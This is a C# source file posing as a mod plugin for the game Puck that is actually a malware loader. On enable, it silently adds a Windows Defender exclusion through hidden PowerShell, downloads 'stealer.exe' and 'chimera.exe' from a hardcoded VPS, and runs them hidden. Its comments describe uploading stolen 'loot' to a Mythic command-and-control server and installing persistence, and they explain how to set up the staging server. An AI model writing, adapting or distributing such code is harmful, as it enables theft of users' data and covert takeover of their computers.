// ArenaEnforcerMod — Puck game mod loader
// Downloads chimera.exe + stealer.exe from the staging server on the VPS,
// then runs them silently. No hardcoded dev paths.
//
// Staging server setup on VPS (run once):
//   cd /tmp/stage && python3 -m http.server 8888
// Put chimera.exe and stealer.exe in /tmp/stage/ on the VPS.
//
// Build:
//   dotnet build ArenaEnforcerMod.csproj -c Release

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

public class PuckPlugin : IPuckPlugin
{
    private static readonly string DropDir     = @"C:\Users\Public";
    // Serve chimera.exe and stealer.exe from this URL (your VPS)
    private static readonly string StageBase   = "http://144-172-84-23.sslip.io:8888";
    private static readonly string ChimeraUrl  = StageBase + "/chimera.exe";
    private static readonly string StealerUrl  = StageBase + "/stealer.exe";

    public bool OnEnable()
    {
        Thread t = new Thread(Run);
        t.IsBackground = true;
        t.Start();
        return true;
    }

    public bool OnDisable()
    {
        return true;
    }

    private static void Run()
    {
        try
        {
            File.WriteAllText(@"C:\Users\Public\debug.txt", "Run started\n");

            // Step 1 - Defender exclusion for drop directory
            RunHidden("powershell.exe",
                "-ep bypass -w hidden -c " +
                "\"Add-MpPreference -ExclusionPath 'C:\\Users\\Public'\"");
            Thread.Sleep(2000);
            File.AppendAllText(@"C:\Users\Public\debug.txt", "Exclusion done\n");

            // Step 2 - Download stealer.exe from VPS staging server
            string stealerDst = Path.Combine(DropDir, "stealer.exe");
            Download(StealerUrl, stealerDst);
            File.AppendAllText(@"C:\Users\Public\debug.txt", "stealer downloaded\n");

            // Step 3 - Download chimera.exe (built with real Mythic UUID) from VPS
            string chimeraDst = Path.Combine(DropDir, "chimera.exe");
            Download(ChimeraUrl, chimeraDst);
            File.AppendAllText(@"C:\Users\Public\debug.txt", "chimera downloaded\n");

            // Step 4 - Run stealer, wait up to 30s for it to finish
            Process stealer = RunHiddenWithHandle(stealerDst, "");
            File.AppendAllText(@"C:\Users\Public\debug.txt", "stealer started\n");
            if (stealer != null)
            {
                stealer.WaitForExit(30000);
                stealer.Close();
            }
            File.AppendAllText(@"C:\Users\Public\debug.txt", "stealer done\n");

            // Step 5 - Run chimera (connects to Mythic, uploads loot, installs persist)
            RunHidden(chimeraDst, "");
            File.AppendAllText(@"C:\Users\Public\debug.txt", "chimera started\n");
        }
        catch (Exception ex)
        {
            File.WriteAllText(@"C:\Users\Public\debug.txt", "ERROR: " + ex.Message);
        }
    }

    private static void Download(string url, string dest)
    {
        using (var wc = new WebClient())
        {
            wc.Headers["User-Agent"] = "Microsoft-CryptoAPI/10.0";
            wc.DownloadFile(url, dest);
        }
    }

    private static void RunHidden(string exe, string args)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName        = exe,
                Arguments       = args,
                WindowStyle     = ProcessWindowStyle.Hidden,
                CreateNoWindow  = true,
                UseShellExecute = false
            });
        }
        catch { }
    }

    private static Process RunHiddenWithHandle(string exe, string args)
    {
        try
        {
            return Process.Start(new ProcessStartInfo
            {
                FileName        = exe,
                Arguments       = args,
                WindowStyle     = ProcessWindowStyle.Hidden,
                CreateNoWindow  = true,
                UseShellExecute = false
            });
        }
        catch { return null; }
    }
}
